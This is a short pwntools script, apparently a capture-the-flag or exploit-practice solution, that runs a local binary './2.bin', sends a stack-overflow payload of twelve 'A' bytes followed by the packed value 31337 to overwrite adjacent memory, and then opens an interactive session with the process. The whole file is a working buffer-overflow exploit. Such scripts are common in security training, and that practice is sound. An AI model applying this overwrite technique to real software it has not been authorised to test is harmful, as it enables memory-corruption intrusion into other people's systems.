
from pwn import *

p = process("./2.bin")

p.send(b"A"*12 + p32(31337))

p.interactive()
